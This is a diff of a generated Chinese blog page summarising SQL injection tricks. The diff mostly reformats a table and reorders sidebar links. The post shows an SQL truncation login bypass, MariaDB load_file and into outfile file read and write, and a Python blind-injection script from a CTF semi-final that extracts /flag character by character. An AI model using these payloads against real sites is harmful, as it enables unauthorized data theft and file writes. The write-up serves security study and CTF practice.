@@ -425,7 +425,7 @@ height:50vh;
 <h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>要求mysql版本5.5以上且设置数据库为宽松模式，避免出现error<br>主要操作就是先注册一个账号为<code>admin+n个空格+1</code>，密码任意，然后登录的时候输入admin和你刚刚注册的密码<br>原来就是mysql在select的时候比较不同长度的字符串时会用空格填充然后在进行比较，而insert的时候则会截断超过长度的字符串  </p>
 <h3 id="通过SQL注入读取文件"><a href="#通过SQL注入读取文件" class="headerlink" title="通过SQL注入读取文件"></a>通过SQL注入读取文件</h3><p>这个菜鸡踩了个大坑，之前线下赛考点这个点，但是用得少，死活记不起来，暴毙……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select load_file(&apos;D:/1.txt&apos;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| load_file(&apos;D:/1.txt&apos;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| u see me              |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure></p>
 <p>顺便拍个当时半决赛的题解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.29.3.104/index.php"</span></span><br><span class="line">chars = string.ascii_letters + string.digits + <span class="string">"&#123;&#125;"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> chars:</span><br><span class="line">        payload = <span class="string">"username='or(load_file('/flag')like/**/binary/**/'"</span> + flag + x + <span class="string">"%')#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"login success"</span> <span class="keyword">in</span> requests.post(url, data=data).content:</span><br><span class="line">            flag += x</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
-<h3 id="通过SQL注入写文件"><a href="#通过SQL注入写文件" class="headerlink" title="通过SQL注入写文件"></a>通过SQL注入写文件</h3><p>需要有写权限才行，局限很大，但是也记一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select 1 into outfile &apos;D:/1.txt&apos;;</span><br><span class="line">ERROR 1086 (HY000): File &apos;D:/1.txt&apos; already exists</span><br><span class="line">MariaDB [door]&gt; select 1 into outfile &apos;D:/2.txt&apos;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">MariaDB [door]&gt; select load_file(&apos;D:/2.txt&apos;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| load_file(&apos;D:/2.txt&apos;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 1</span><br><span class="line">                    |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.28 sec)</span><br></pre></td></tr></table></figure></p>
+<h3 id="通过SQL注入写文件"><a href="#通过SQL注入写文件" class="headerlink" title="通过SQL注入写文件"></a>通过SQL注入写文件</h3><p>需要有写权限才行，局限很大，但是也记一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [door]&gt; select 1 into outfile &apos;D:/1.txt&apos;;</span><br><span class="line">ERROR 1086 (HY000): File &apos;D:/1.txt&apos; already exists</span><br><span class="line">MariaDB [door]&gt; select 1 into outfile &apos;D:/2.txt&apos;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">MariaDB [door]&gt; select load_file(&apos;D:/2.txt&apos;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| load_file(&apos;D:/2.txt&apos;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 1                     |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.28 sec)</span><br></pre></td></tr></table></figure></p>
 
     </article>
     <!-- license  -->
@@ -1371,6 +1371,16 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 52
@@ -1394,7 +1404,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/2019/06/26/SQL注入汇总/">SQL注入汇总</a>
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/2019/06/26/sql注入汇总/">SQL注入汇总</a>
         </li>
     
     
@@ -1444,12 +1454,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/2019西湖论剑web-writeup/">2019西湖论剑web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/2019西湖论剑web-writeup/">2019西湖论剑web writeup</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href="/2019/04/11/rips-2017/">rips 2017</a>
         </li>
     
     
@@ -1665,9 +1675,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="安恒杯"><span class="iconfont-archer">&#xe606;</span>安恒杯</span>
     
-        <span class="sidebar-tag-name" data-tags="Code Breaking"><span class="iconfont-archer">&#xe606;</span>Code Breaking</span>
-    
         <span class="sidebar-tag-name" data-tags="MongoDB"><span class="iconfont-archer">&#xe606;</span>MongoDB</span>
+    
+        <span class="sidebar-tag-name" data-tags="Code Breaking"><span class="iconfont-archer">&#xe606;</span>Code Breaking</span>
     
         <span class="sidebar-tag-name" data-tags="php_tricks"><span class="iconfont-archer">&#xe606;</span>php_tricks</span>
     
